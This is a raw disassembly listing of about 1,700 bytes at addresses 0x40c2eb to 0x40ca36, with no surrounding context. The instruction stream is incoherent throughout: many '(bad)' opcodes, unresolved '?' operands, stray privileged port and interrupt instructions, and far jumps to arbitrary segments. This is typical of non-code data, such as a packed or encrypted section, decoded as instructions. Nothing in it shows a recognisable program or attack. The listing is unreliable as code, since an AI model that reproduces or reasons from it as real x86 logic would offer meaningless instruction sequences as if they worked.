  40c2eb:	mov    esi,0xaa7ffe4c
  40c2f0:	jl     0x40c2dc
  40c2f2:	cdq    
  40c2f3:	add    eax,0xb35f90b8
  40c2f8:	enter  0x1ae6,0xdf
  40c2fc:	fs pop eax
  40c2fe:	jmp    0x8aab:0x6d0de948
  40c305:	fistp  QWORD PTR [ecx+eax*2-0x4ffe8637]
  40c30c:	test   eax,0x6d2b11bf
  40c311:	adc    BYTE PTR [edi],al
  40c313:	mov    BYTE PTR [ebp+0x26ba8350],al
  40c319:	imul   eax,DWORD PTR [edx-0x43],0x9
  40c31d:	pop    es
  40c31e:	push   0x5e7f769f
  40c323:	fldcw  WORD PTR [esi-0x6]
  40c326:	pop    ebx
  40c327:	mov    ah,0x71
  40c329:	stos   BYTE PTR es:[edi],al
  40c32a:	adc    bh,dl
  40c32c:	dec    ebx
  40c32d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c32e:	sti    
  40c32f:	dec    BYTE PTR [edx]
  40c331:	sub    eax,0xa96f54e5
  40c336:	loope  0x40c2bb
  40c338:	stos   BYTE PTR es:[edi],al
  40c339:	rcr    BYTE PTR [eax],0xc2
  40c33c:	cld    
  40c33d:	sti    
  40c33e:	jb     0x40c357
  40c340:	cli    
  40c341:	inc    edx
  40c342:	mov    eax,0xde157da3
  40c347:	sbb    BYTE PTR [eax-0x7895cda0],cl
  40c34d:	inc    DWORD PTR [ebx+0x72]
  40c350:	and    BYTE PTR [edx-0x62232043],bl
  40c356:	dec    ecx
  40c357:	push   edx
  40c358:	sbb    al,0xcd
  40c35a:	pop    ds
  40c35b:	lds    edi,FWORD PTR fs:[ecx-0x34bb5472]
  40c362:	scas   eax,DWORD PTR es:[edi]
  40c363:	push   ebp
  40c364:	aaa    
  40c365:	popa   
  40c366:	fs push cs
  40c368:	sbb    ch,BYTE PTR ss:0xd2bdddec
  40c36f:	ds mov ah,0x54
  40c372:	xchg   DWORD PTR [ebp+0x72fd6e98],esi
  40c378:	sar    BYTE PTR [eax],0x59
  40c37b:	in     al,dx
  40c37c:	inc    edi
  40c37d:	aaa    
  40c37e:	inc    esp
  40c37f:	call   0xbe95fe34
  40c384:	ss or  al,0x29
  40c387:	outs   dx,BYTE PTR ds:[esi]
  40c388:	fwait
  40c389:	xchg   ebx,eax
  40c38a:	iret   
  40c38b:	adc    al,0x4d
  40c38d:	aas    
  40c38e:	jno    0x40c40d
  40c390:	arpl   dx,cx
  40c392:	das    
  40c393:	mov    al,0x61
  40c395:	xchg   esi,eax
  40c396:	dec    ebx
  40c397:	mov    DWORD PTR ds:0x67c26d5e,ecx
  40c39d:	or     BYTE PTR [ebp+0x43451a07],dh
  40c3a3:	jo     0x40c34d
  40c3a5:	xor    dl,dl
  40c3a7:	inc    ecx
  40c3a8:	aas    
  40c3a9:	dec    BYTE PTR [esi]
  40c3ab:	mov    cl,0x1c
  40c3ad:	and    ch,BYTE PTR [ebp+edi*4-0x7c996a94]
  40c3b4:	pop    eax
  40c3b5:	(bad)  
  40c3b6:	push   eax
  40c3b7:	mov    WORD PTR [ecx],?
  40c3b9:	dec    eax
  40c3ba:	pop    ebx
  40c3bb:	fsubrp st(7),st
  40c3bd:	mov    ?,WORD PTR [ebx+0x4a]
  40c3c0:	fnstenv [edi+0x66b84af4]
  40c3c6:	cmp    DWORD PTR [ebp+0x74],ebp
  40c3c9:	data16 aaa 
  40c3cb:	jp     0x40c35e
  40c3cd:	jb     0x40c37d
  40c3cf:	loope  0x40c382
  40c3d1:	(bad)  
  40c3d2:	shr    BYTE PTR [ebp+0x44],1
  40c3d5:	imul   esi,DWORD PTR [edi],0x9d3477d9
  40c3db:	inc    edi
  40c3dc:	repz ficom WORD PTR [eax+0x49]
  40c3e0:	mov    esp,0x34b922e5
  40c3e5:	cmp    BYTE PTR [edx+0x6a],0xd2
  40c3e9:	aaa    
  40c3ea:	in     eax,dx
  40c3eb:	daa    
  40c3ec:	sar    ah,cl
  40c3ee:	xchg   esi,eax
  40c3ef:	test   esp,ecx
  40c3f1:	shr    BYTE PTR [ebp-0x6a],cl
  40c3f4:	fcom   st(6)
  40c3f6:	clc    
  40c3f7:	xchg   ebx,eax
  40c3f8:	sbb    al,0xaf
  40c3fa:	inc    edx
  40c3fb:	add    eax,0x308924f7
  40c400:	loopne 0x40c38d
  40c402:	adc    al,0xcc
  40c404:	retf   
  40c405:	nop
  40c406:	pop    es
  40c407:	imul   ebx,DWORD PTR [ecx],0x73
  40c40a:	push   edx
  40c40b:	(bad)  [eax+0x7146fc2c]
  40c411:	pop    edx
  40c412:	and    BYTE PTR [eax+edi*2],dl
  40c415:	jle    0x40c48c
  40c417:	aaa    
  40c418:	pop    ds
  40c419:	fild   DWORD PTR [edi+0x6e055dfc]
  40c41f:	push   0xe2d1b8e3
  40c424:	sahf   
  40c425:	pop    es
  40c426:	sub    DWORD PTR [eax-0x3cca9bd4],ecx
  40c42c:	jne    0x40c3db
  40c42e:	mov    bh,0x7a
  40c430:	fidiv  WORD PTR [edi+0x1]
  40c433:	inc    ebx
  40c434:	pop    ebp
  40c435:	lea    esi,[ebp-0x18]
  40c438:	jno    0x40c3ce
  40c43a:	(bad)  
  40c43b:	mov    edi,0x48866e98
  40c440:	mov    al,ds:0xf66f4459
  40c445:	push   esp
  40c446:	pop    edi
  40c447:	push   0x44
  40c449:	mov    al,0xfb
  40c44b:	sub    dl,bh
  40c44d:	inc    eax
  40c44e:	cdq    
  40c44f:	outs   dx,BYTE PTR ds:[esi]
  40c450:	(bad)  
  40c451:	pop    edx
  40c452:	mov    eax,0x7871016a
  40c457:	loopne 0x40c471
  40c459:	(bad)  
  40c45a:	daa    
  40c45b:	inc    eax
  40c45c:	push   ebx
  40c45d:	and    BYTE PTR [edi-0x6a],al
  40c460:	jmp    0x40c47d
  40c462:	mov    fs,WORD PTR [esi-0x17]
  40c465:	pop    ebx
  40c466:	dec    edi
  40c467:	repz cwde 
  40c469:	jmp    0x58d1:0xd5f93c43
  40c470:	xor    DWORD PTR [ebx],eax
  40c472:	sbb    al,0x13
  40c474:	int3   
  40c475:	adc    al,0xaa
  40c477:	jecxz  0x40c4a8
  40c479:	pop    ecx
  40c47a:	sub    BYTE PTR [ebx],0x3
  40c47d:	jnp    0x40c4db
  40c47f:	adc    bh,BYTE PTR [esi-0x6f]
  40c482:	call   0xfb25:0x4c55e894
  40c489:	out    dx,eax
  40c48a:	jg     0x40c4a1
  40c48c:	loopne 0x40c47b
  40c48e:	retf   0xb3f9
  40c491:	in     eax,0xed
  40c493:	lods   eax,DWORD PTR ds:[esi]
  40c494:	(bad)  
  40c495:	in     al,dx
  40c496:	lahf   
  40c497:	sub    eax,0xb6faaed7
  40c49c:	cmp    DWORD PTR [edi],0x3f3ecac
  40c4a2:	(bad)  [edx]
  40c4a4:	adc    eax,0x5416910f
  40c4a9:	dec    eax
  40c4aa:	lahf   
  40c4ab:	aaa    
  40c4ac:	loop   0x40c515
  40c4ae:	in     al,0x1
  40c4b0:	test   DWORD PTR [ebx+0x3709f936],edi
  40c4b6:	pop    esi
  40c4b7:	bound  ecx,QWORD PTR [ecx+0x543ee1b0]
  40c4bd:	adc    BYTE PTR [esi],0x51
  40c4c0:	daa    
  40c4c1:	xchg   edi,eax
  40c4c2:	lds    ebp,FWORD PTR [edx]
  40c4c4:	cld    
  40c4c5:	xchg   BYTE PTR [esp+ebp*2-0x1ef0637d],bh
  40c4cc:	call   DWORD PTR [ebx-0x6529b9a1]
  40c4d2:	adc    BYTE PTR [edx+0x4e444586],bl
  40c4d8:	call   0xf62ff564
  40c4dd:	ret    
  40c4de:	pusha  
  40c4df:	out    dx,eax
  40c4e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4e1:	xor    eax,0x8c7e59a3
  40c4e6:	mov    ch,0x84
  40c4e8:	jne    0x40c53b
  40c4ea:	fcomp  DWORD PTR [esi+0x52]
  40c4ed:	lea    esi,ds:0x5a04b004
  40c4f3:	mov    ebp,0x64d4ed
  40c4f8:	adc    eax,esp
  40c4fa:	sub    al,0x6c
  40c4fc:	dec    edx
  40c4fd:	push   eax
  40c4fe:	outs   dx,DWORD PTR ds:[esi]
  40c4ff:	fst    DWORD PTR [ecx]
  40c501:	add    eax,0xfaf5e63d
  40c506:	icebp  
  40c507:	xchg   BYTE PTR [esi],ch
  40c509:	fstp   QWORD PTR [ebp-0x205e895f]
  40c50f:	push   esi
  40c510:	push   ss
  40c511:	leave  
  40c512:	fidiv  WORD PTR [ecx-0x33803a2d]
  40c518:	xor    cl,BYTE PTR [edx+0x40785e26]
  40c51e:	jmp    0x40c578
  40c520:	ins    DWORD PTR es:[edi],dx
  40c521:	pop    ss
  40c522:	push   eax
  40c523:	loope  0x40c4d8
  40c525:	aad    0xe5
  40c527:	xor    esi,DWORD PTR [esi-0x5a]
  40c52a:	stos   DWORD PTR es:[edi],eax
  40c52b:	repnz int 0xa3
  40c52e:	js     0x40c4df
  40c530:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c531:	add    ebx,edi
  40c533:	and    eax,0xffb09ee5
  40c538:	addr16 aad 0xe0
  40c53b:	mov    ch,0xf8
  40c53d:	pop    ds
  40c53e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c53f:	ins    DWORD PTR es:[edi],dx
  40c540:	and    edi,DWORD PTR [edx+ebx*1+0x7e]
  40c544:	js     0x40c5a8
  40c546:	push   esp
  40c547:	mov    BYTE PTR [ebx],dl
  40c549:	dec    esi
  40c54a:	mov    edx,0x1e070344
  40c54f:	xor    eax,0xcc8411f1
  40c554:	stos   BYTE PTR es:[edi],al
  40c555:	mov    bl,0x9e
  40c557:	sub    al,0x54
  40c559:	push   es
  40c55a:	sar    ch,1
  40c55c:	cbw    
  40c55e:	add    BYTE PTR [esp+esi*1+0x29],0x38
  40c563:	rcr    DWORD PTR [ebx],0x52
  40c566:	nop
  40c567:	mov    DWORD PTR [esp+ebp*2+0x330b0326],eax
  40c56e:	pop    esi
  40c56f:	mov    ebx,0x28d00d2a
  40c574:	in     eax,0x60
  40c576:	and    al,0xe9
  40c578:	push   esi
  40c579:	pop    eax
  40c57a:	sbb    eax,0x981e5ce0
  40c57f:	jae    0x40c536
  40c581:	mov    ds,WORD PTR [ebx+0x3417b336]
  40c587:	cdq    
  40c588:	jmp    0x40c580
  40c58a:	idiv   DWORD PTR [ebx-0x28ed6746]
  40c590:	dec    esi
  40c591:	pop    edi
  40c592:	adc    BYTE PTR [eax],dl
  40c594:	jne    0x40c59f
  40c596:	mov    DWORD PTR [eax+0x5a],ebx
  40c599:	int    0xe9
  40c59b:	test   BYTE PTR [ebp-0x43],bl
  40c59e:	jecxz  0x40c5cc
  40c5a0:	mov    bh,0x3
  40c5a2:	retf   0xb8fc
  40c5a5:	xchg   DWORD PTR [ebx],ebp
  40c5a7:	je     0x40c584
  40c5a9:	cmp    eax,0x643c0080
  40c5ae:	dec    esp
  40c5af:	add    edi,DWORD PTR [eax+0x712f0ce8]
  40c5b5:	test   eax,0x9f1727ff
  40c5ba:	das    
  40c5bb:	xchg   esi,eax
  40c5bc:	jecxz  0x40c5b9
  40c5be:	push   ebx
  40c5bf:	or     eax,0x89e64f44
  40c5c4:	cmp    al,0x50
  40c5c6:	xor    al,0x18
  40c5c8:	xchg   esp,eax
  40c5c9:	or     eax,0x44670f4b
  40c5ce:	and    edi,edx
  40c5d0:	sahf   
  40c5d1:	cmp    BYTE PTR [ecx+0x38],bh
  40c5d4:	push   eax
  40c5d5:	xchg   edi,eax
  40c5d6:	sub    DWORD PTR [edi-0xf4bba0b],0xc6d7d7f
  40c5e0:	xor    ebp,DWORD PTR [esi]
  40c5e2:	in     al,0x24
  40c5e4:	mov    bh,BYTE PTR [ecx]
  40c5e6:	out    0xa1,eax
  40c5e8:	sub    BYTE PTR [eax+0x56],bl
  40c5eb:	leave  
  40c5ec:	ins    BYTE PTR es:[edi],dx
  40c5ed:	pop    ebp
  40c5ee:	inc    ebp
  40c5ef:	push   eax
  40c5f0:	cld    
  40c5f1:	sub    BYTE PTR ds:0xdba39814,bl
  40c5f7:	sub    eax,0xa325788e
  40c5fc:	push   cs
  40c5fd:	push   ebp
  40c5fe:	sub    al,0x82
  40c600:	lds    esp,FWORD PTR [edx]
  40c602:	push   ds
  40c603:	ss js  0x40c613
  40c606:	xchg   ebp,eax
  40c607:	test   al,0xdc
  40c609:	push   cs
  40c60a:	cmp    eax,0xbf0be05e
  40c60f:	enter  0x7cdb,0x3e
  40c613:	xor    edx,DWORD PTR [edi-0x49a5d984]
  40c619:	jle    0x40c5b4
  40c61b:	test   dl,ah
  40c61d:	bound  esp,QWORD PTR [ebp-0x589640cc]
  40c623:	mov    WORD PTR [ebp-0x5a7b1cd1],?
  40c629:	imul   eax,DWORD PTR [esi],0x6a
  40c62c:	(bad)  
  40c62d:	into   
  40c62e:	push   edx
  40c62f:	ret    
  40c630:	outs   dx,DWORD PTR ds:[esi]
  40c631:	sub    ah,ch
  40c633:	leave  
  40c634:	loopne 0x40c681
  40c636:	shr    bl,0xb8
  40c639:	out    dx,eax
  40c63a:	mov    ebx,0x56bfac32
  40c63f:	mov    ebp,0x7b880a4a
  40c644:	adc    DWORD PTR [edx+0x58],esi
  40c647:	aas    
  40c648:	mov    bh,0x8e
  40c64a:	add    edx,DWORD PTR [ebx-0x57]
  40c64d:	inc    esp
  40c64e:	out    dx,al
  40c64f:	adc    DWORD PTR [edx],edi
  40c651:	out    0x74,al
  40c653:	pop    edx
  40c654:	punpcklbw mm6,DWORD PTR [eax+esi*1]
  40c658:	lock inc esp
  40c65a:	std    
  40c65b:	pop    eax
  40c65c:	dec    ebp
  40c65d:	retf   0x559
  40c660:	test   edx,edx
  40c662:	out    dx,al
  40c663:	add    BYTE PTR [esp+esi*1],0xb7
  40c667:	and    dl,bh
  40c669:	outs   dx,DWORD PTR ds:[esi]
  40c66a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c66b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c66c:	push   ds
  40c66d:	or     BYTE PTR [esi-0x3d],ah
  40c670:	push   ss
  40c671:	jno    0x40c656
  40c673:	mov    WORD PTR [ecx+0x560a95f8],cs
  40c679:	mov    DWORD PTR [edx],edx
  40c67b:	pusha  
  40c67c:	in     eax,0x99
  40c67e:	lods   eax,DWORD PTR ds:[esi]
  40c67f:	dec    ebp
  40c680:	iret   
  40c681:	dec    ebp
  40c682:	test   BYTE PTR [esi-0x1e2ab5ac],ch
  40c688:	sub    al,0x74
  40c68a:	mov    ds:0x87e3c59d,eax
  40c68f:	test   dh,0xdc
  40c692:	cmp    bh,dl
  40c694:	push   esp
  40c695:	test   DWORD PTR [eax+0x331fefdd],esi
  40c69b:	mov    al,0x9f
  40c69d:	xchg   esp,esi
  40c69f:	jmp    0x40c6a0
  40c6a1:	daa    
  40c6a2:	data16 jnp 0x40c6cb
  40c6a5:	or     eax,0xdc0aec45
  40c6aa:	nop
  40c6ab:	push   esp
  40c6ac:	stos   BYTE PTR es:[edi],al
  40c6ad:	jge    0x40c69f
  40c6af:	lods   al,BYTE PTR ds:[esi]
  40c6b0:	xor    cl,BYTE PTR [eax-0x3a]
  40c6b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6b4:	push   edi
  40c6b5:	inc    edx
  40c6b6:	(bad)  
  40c6b7:	mov    bh,0xe
  40c6b9:	call   0x7f56:0x85ab21bb
  40c6c0:	pusha  
  40c6c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6c2:	sub    BYTE PTR ds:0xccc7c771,bl
  40c6c8:	dec    esp
  40c6c9:	outs   dx,DWORD PTR ds:[esi]
  40c6ca:	adc    cl,BYTE PTR [esi-0x4b454d9e]
  40c6d0:	adc    al,0x3f
  40c6d2:	aas    
  40c6d3:	(bad)  
  40c6d4:	mov    esi,0xf1ca0f6c
  40c6d9:	pop    edi
  40c6da:	lds    esi,FWORD PTR [edx]
  40c6dc:	cdq    
  40c6dd:	push   ecx
  40c6de:	out    dx,eax
  40c6df:	lea    ebp,[esi]
  40c6e1:	outs   dx,DWORD PTR ds:[esi]
  40c6e2:	and    DWORD PTR [edx],esp
  40c6e4:	jo     0x40c6fc
  40c6e6:	(bad)  
  40c6e7:	cwde   
  40c6e8:	arpl   WORD PTR [ebx-0x286c83b9],dx
  40c6ee:	sub    al,ch
  40c6f0:	shl    BYTE PTR ss:[edx],cl
  40c6f3:	in     eax,dx
  40c6f4:	std    
  40c6f5:	fbstp  TBYTE PTR [edx-0x5b]
  40c6f8:	js     0x40c699
  40c6fa:	mov    edi,0x446cda7d
  40c6ff:	gs xchg esp,eax
  40c701:	inc    eax
  40c702:	test   DWORD PTR [edx],ecx
  40c704:	dec    esi
  40c705:	out    dx,al
  40c706:	mov    esp,0xfc377549
  40c70b:	jl     0x40c6d3
  40c70d:	or     eax,0x919f2223
  40c712:	sub    DWORD PTR [ecx],ebp
  40c714:	mov    WORD PTR [edx+0x64f48cef],fs
  40c71a:	add    ecx,edi
  40c71c:	xor    bh,BYTE PTR [edx]
  40c71e:	push   es
  40c71f:	jle    0x40c708
  40c721:	fdivr  QWORD PTR [edx-0x28]
  40c724:	xchg   ebp,eax
  40c725:	retf   0xb95f
  40c728:	fld    TBYTE PTR [ecx+edi*4+0x34a67dca]
  40c72f:	cmp    edx,DWORD PTR [eax-0x5bdfc1a6]
  40c735:	mov    eax,DWORD PTR [eax+0x126be9a1]
  40c73b:	mov    bh,0x1c
  40c73d:	add    al,0x59
  40c73f:	xor    BYTE PTR [ecx-0x7dc9e596],ah
  40c745:	icebp  
  40c746:	leave  
  40c747:	pusha  
  40c748:	popf   
  40c749:	push   ebx
  40c74a:	imul   edx,ebx,0x13
  40c74d:	and    cl,BYTE PTR [esi+0xd]
  40c750:	loopne 0x40c6e5
  40c752:	loope  0x40c77e
  40c754:	imul   esp,DWORD PTR [edx-0x4c],0xffffffa4
  40c758:	or     DWORD PTR [esi-0x5b],esi
  40c75b:	arpl   cx,di
  40c75d:	xchg   esi,eax
  40c75e:	test   eax,0x7404770c
  40c763:	xchg   esp,eax
  40c764:	dec    edx
  40c765:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c766:	(bad)  
  40c767:	and    dl,0x72
  40c76a:	sbb    DWORD PTR cs:[ecx-0x7],ebx
  40c76e:	cmp    bh,BYTE PTR [ecx+0x62]
  40c771:	add    DWORD PTR [ebp+0x1b3865ea],ebp
  40c777:	test   eax,0x259ce9a6
  40c77c:	ficom  WORD PTR [esi]
  40c77e:	pop    ebx
  40c77f:	fdiv   QWORD PTR [eax+0x17]
  40c782:	xchg   DWORD PTR gs:[edi-0x6ef4217f],esp
  40c789:	pop    ebx
  40c78a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c78b:	fidivr WORD PTR [edi+0x48]
  40c78e:	int3   
  40c78f:	cmp    cl,dh
  40c791:	dec    esi
  40c792:	xor    al,0x8b
  40c794:	sbb    ah,BYTE PTR [esi+0x7dbc3db4]
  40c79a:	icebp  
  40c79b:	push   ebx
  40c79c:	sub    al,0x8
  40c79e:	and    edx,DWORD PTR [eax]
  40c7a0:	push   ecx
  40c7a1:	xchg   DWORD PTR [edi+0x177e4815],ebx
  40c7a7:	inc    edi
  40c7a8:	pushf  
  40c7a9:	inc    esi
  40c7aa:	pop    ecx
  40c7ab:	jl     0x40c785
  40c7ad:	jmp    0x51aa:0x89c44ebb
  40c7b4:	popa   
  40c7b5:	xchg   ebx,eax
  40c7b6:	jo     0x40c7d5
  40c7b8:	lahf   
  40c7b9:	xchg   DWORD PTR [edi],ecx
  40c7bb:	retf   0x921a
  40c7be:	push   edx
  40c7bf:	push   edx
  40c7c0:	int3   
  40c7c1:	shl    DWORD PTR ds:0x52e50fa3,1
  40c7c7:	inc    esp
  40c7c8:	loope  0x40c77d
  40c7ca:	and    BYTE PTR [ecx+0x307fe0ac],al
  40c7d0:	push   edi
  40c7d1:	imul   ecx,edx,0x9a0c91b1
  40c7d7:	inc    edx
  40c7d8:	inc    edi
  40c7d9:	xchg   ebp,eax
  40c7da:	dec    edi
  40c7dc:	mov    edi,DWORD PTR [esi]
  40c7de:	out    dx,eax
  40c7df:	jo     0x40c813
  40c7e1:	or     esp,DWORD PTR ds:0xb0741d3d
  40c7e7:	sbb    DWORD PTR [ecx],esp
  40c7e9:	shl    BYTE PTR [ebx+eax*8-0x7be4d874],1
  40c7f0:	lea    eax,[eax]
  40c7f2:	inc    ebp
  40c7f3:	div    DWORD PTR [esi-0x6]
  40c7f6:	test   BYTE PTR [edi-0x66],dl
  40c7f9:	cwde   
  40c7fa:	dec    esi
  40c7fb:	xchg   DWORD PTR [ecx-0x2e],edx
  40c7fe:	sbb    ebx,esi
  40c800:	jge    0x40c841
  40c802:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c803:	mov    al,0xd5
  40c805:	inc    edx
  40c806:	(bad)  
  40c807:	adc    edi,DWORD PTR [ebp-0x38]
  40c80a:	mov    edi,0x22a63f34
  40c80f:	rcl    dh,0x26
  40c812:	mov    ?,WORD PTR [edx-0x3296b9a1]
  40c818:	cmp    ebp,ebx
  40c81a:	jbe    0x40c7cb
  40c81c:	xchg   DWORD PTR cs:[ecx],ebp
  40c81f:	mov    dl,0xcf
  40c821:	dec    ecx
  40c822:	std    
  40c823:	xor    DWORD PTR ds:0x1516a433,0x75
  40c82a:	mov    ebp,0x18053c17
  40c82f:	sbb    BYTE PTR [eax+ebx*1],bh
  40c832:	inc    esp
  40c833:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c834:	jmp    0xc8a3:0x61fe4b22
  40c83b:	jmp    0xd1b9:0x4535c82c
  40c842:	inc    eax
  40c843:	pop    es
  40c844:	xor    eax,DWORD PTR [eax+0x7bf1faf5]
  40c84a:	das    
  40c84b:	pusha  
  40c84c:	pop    eax
  40c84d:	sti    
  40c84e:	(bad)
  40c851:	lahf   
  40c852:	pop    es
  40c853:	add    esp,DWORD PTR [esp+edx*1+0x5b76de80]
  40c85a:	mov    dl,0x37
  40c85c:	pop    ebx
  40c85d:	addr16 test ch,0x79
  40c861:	vcmplt_oqsd xmm3,xmm4,QWORD PTR [ecx+edx*4+0x48ecfa9e]
  40c86b:	stc    
  40c86c:	or     esi,DWORD PTR [ebp-0x75bcfbab]
  40c872:	in     eax,0x8
  40c874:	stos   BYTE PTR es:[edi],al
  40c875:	stos   BYTE PTR es:[edi],al
  40c876:	or     eax,0x2c510c3b
  40c87b:	sub    BYTE PTR [ebx+0x673f7e77],al
  40c881:	push   ebx
  40c882:	and    al,0xe3
  40c884:	mov    al,ss:0x57d332a
  40c88a:	xor    al,0x6
  40c88c:	scas   al,BYTE PTR es:[edi]
  40c88d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c88e:	loopne 0x40c899
  40c890:	ins    BYTE PTR es:[edi],dx
  40c891:	into   
  40c892:	inc    ebp
  40c893:	jne    0x40c910
  40c895:	pop    es
  40c896:	(bad)  
  40c897:	sahf   
  40c898:	rcr    DWORD PTR [ecx-0x44287da2],cl
  40c89e:	mov    edx,0x259ff4df
  40c8a3:	xchg   esp,eax
  40c8a4:	mov    esi,0x3233fb1f
  40c8a9:	push   ecx
  40c8aa:	pop    ds
  40c8ab:	sbb    eax,0x2756cd87
  40c8b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8b1:	setp   cl
  40c8b4:	repz pushf 
  40c8b6:	icebp  
  40c8b7:	inc    edx
  40c8b8:	adc    bl,bl
  40c8ba:	repnz xchg ebx,eax
  40c8bc:	xor    BYTE PTR [edx],0xbf
  40c8bf:	mov    ds:0xe2b39b60,al
  40c8c4:	pop    ebp
  40c8c5:	cmp    DWORD PTR [ebx+0x71],0x78
  40c8c9:	in     al,0xcb
  40c8cb:	add    ebx,eax
  40c8cd:	mov    bh,0x76
  40c8cf:	sbb    eax,0xd727dd71
  40c8d4:	cmp    ah,BYTE PTR [ecx-0x32ff0e46]
  40c8da:	in     eax,0x54
  40c8dc:	or     al,0x36
  40c8de:	test   DWORD PTR [eax-0x13],edi
  40c8e1:	lods   al,BYTE PTR ds:[esi]
  40c8e2:	pop    esp
  40c8e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8e4:	xor    edi,DWORD PTR [ecx]
  40c8e6:	into   
  40c8e7:	sbb    BYTE PTR [ebx+ecx*1+0x78f992db],ch
  40c8ee:	stos   DWORD PTR es:[edi],eax
  40c8ef:	(bad)  
  40c8f0:	stos   BYTE PTR es:[edi],al
  40c8f1:	frstor [ecx+0x4]
  40c8f4:	in     eax,dx
  40c8f5:	xlat   BYTE PTR ds:[ebx]
  40c8f6:	call   DWORD PTR [ecx-0x47]
  40c8f9:	int    0x6e
  40c8fb:	idiv   BYTE PTR [eax+0x11]
  40c8fe:	bound  ebp,QWORD PTR [eax]
  40c900:	adc    esi,DWORD PTR [edi-0x56066796]
  40c906:	fisttp QWORD PTR [edx+0x62e9fddd]
  40c90c:	push   0x7694fa4f
  40c911:	push   ebp
  40c912:	lods   eax,DWORD PTR ds:[esi]
  40c913:	out    0x91,al
  40c915:	and    al,0x70
  40c917:	bound  edx,QWORD PTR [edi]
  40c919:	xor    ecx,ecx
  40c91b:	xor    al,0x50
  40c91d:	cmp    DWORD PTR [edi],eax
  40c91f:	pushf  
  40c920:	jo     0x40c8a3
  40c922:	lahf   
  40c923:	xchg   esp,eax
  40c924:	xchg   BYTE PTR [edi+ebp*8+0x20],ah
  40c928:	mov    ebx,0x8fc60cbe
  40c92d:	daa    
  40c92e:	and    DWORD PTR [edx+0x31caee9b],ecx
  40c934:	dec    ebp
  40c935:	and    BYTE PTR [ecx],0x3a
  40c938:	retf   0x272a
  40c93b:	fsub   DWORD PTR [esi-0x6]
  40c93e:	adc    DWORD PTR [ebp+0x33],esi
  40c941:	pop    esi
  40c942:	ins    BYTE PTR es:[edi],dx
  40c943:	push   edi
  40c944:	enter  0xae17,0x6f
  40c948:	add    esi,DWORD PTR [ebx]
  40c94a:	cmp    ecx,DWORD PTR [ebx+0x35f80ce1]
  40c950:	sbb    DWORD PTR [ebp+ecx*8+0x54aac359],0xfffffff6
  40c958:	jno    0x40c92a
  40c95a:	inc    esi
  40c95b:	(bad)  
  40c95d:	mov    ecx,0x781eb2a5
  40c962:	xlat   BYTE PTR ds:[ebx]
  40c963:	leave  
  40c964:	push   ecx
  40c965:	aas    
  40c966:	icebp  
  40c967:	pop    edx
  40c968:	cmp    eax,0xdb062086
  40c96d:	in     eax,0xe6
  40c96f:	xor    eax,0xbfc33350
  40c974:	(bad)  
  40c975:	push   edx
  40c976:	scas   al,BYTE PTR es:[edi]
  40c977:	les    esi,FWORD PTR [ecx+0x417cdb2]
  40c97d:	shl    dh,cl
  40c97f:	rcl    BYTE PTR [edi-0x64],1
  40c982:	lods   eax,DWORD PTR ds:[esi]
  40c983:	(bad)  
  40c984:	sbb    eax,0xe693ba38
  40c989:	mov    edi,ds
  40c98b:	xor    DWORD PTR [ebp-0x5394db47],eax
  40c991:	call   0x3cc5ed27
  40c996:	cmp    BYTE PTR [ecx],ah
  40c998:	mov    bl,0x66
  40c99a:	or     esp,DWORD PTR [edi+0x13]
  40c99d:	add    DWORD PTR [eax-0x5a],edx
  40c9a0:	arpl   WORD PTR [ebp-0x4a],si
  40c9a3:	jne    0x40c9a9
  40c9a5:	fst    QWORD PTR [ecx+0x6f4363a8]
  40c9ab:	lods   al,BYTE PTR ds:[esi]
  40c9ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9ad:	inc    esi
  40c9ae:	pop    ss
  40c9af:	arpl   WORD PTR [ecx+0x18f88a33],ax
  40c9b5:	shl    al,0x69
  40c9b8:	rcl    ebp,cl
  40c9ba:	fisttp WORD PTR [eax-0x6a35efc]
  40c9c0:	jo     0x40c9ec
  40c9c2:	mov    edx,0xa9919866
  40c9c7:	sub    DWORD PTR [eax],edx
  40c9c9:	mov    edx,0xbf7b4502
  40c9ce:	sub    al,0xe8
  40c9d0:	loop   0x40ca1d
  40c9d2:	loop   0x40ca48
  40c9d4:	fwait
  40c9d5:	add    BYTE PTR ds:0x8ed1b654,bl
  40c9db:	popf   
  40c9dc:	push   ecx
  40c9dd:	push   0xedebe818
  40c9e2:	jecxz  0x40c9da
  40c9e4:	xor    BYTE PTR [ebx+ebx*2-0x3d5c4b55],bh
  40c9eb:	mov    BYTE PTR es:[ebx+0x5156ded4],bh
  40c9f2:	fldcw  WORD PTR [ecx-0x58]
  40c9f5:	in     al,0xc3
  40c9f7:	push   eax
  40c9f8:	cld    
  40c9f9:	js     0x40ca1e
  40c9fb:	shl    ebx,cl
  40c9fd:	mov    edi,0x25d18e24
  40ca02:	js     0x40c9e3
  40ca04:	fcomp  QWORD PTR [ebx-0x78e6952b]
  40ca0a:	jns    0x40c9a2
  40ca0c:	std    
  40ca0d:	jg     0x40ca59
  40ca0f:	and    eax,DWORD PTR [edi+0x79]
  40ca12:	push   ebp
  40ca13:	jb     0x40ca2e
  40ca15:	adc    DWORD PTR [esi],esp
  40ca17:	mov    bl,BYTE PTR [edx-0x32]
  40ca1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca1b:	xor    cl,BYTE PTR [edx+ebx*2+0x672bac36]
  40ca22:	or     eax,DWORD PTR [ecx-0x51]
  40ca25:	in     eax,0x88
  40ca27:	sub    eax,0x6a925571
  40ca2c:	xor    eax,0x985f20f2
  40ca31:	lock hlt 
  40ca33:	push   esi
  40ca34:	jp     0x40ca46
  40ca36:	leave  
